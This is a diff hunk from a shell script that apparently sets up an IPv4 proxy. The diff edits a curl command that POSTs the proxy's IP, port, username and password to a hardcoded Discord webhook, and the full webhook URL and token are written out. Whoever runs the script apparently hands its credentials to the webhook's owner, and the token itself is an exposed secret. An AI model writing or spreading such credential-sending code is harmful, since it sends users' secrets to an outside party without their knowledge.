@@ -22,5 +22,5 @@ echo -e "\e[1;93mYour ipv4 Proxy is : ${ip}:${port}:${user}:${passw}\e[0m"
 
 ## discord webhook
 url='https://discordapp.com/api/webhooks/750337905054056588/5fP6iSAPGFHi2un9ayvAGHtokf7BSf5FWTSP86BdgbU2oJKI9icZRDSUcDqcSFy2A7h5'
-curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$ip:$port:$user:$passw\"\"embed\": \"$ip:$port:$user:$passw\"}" $url
+curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$ip:$port:$user:$passw\"}" $url
 
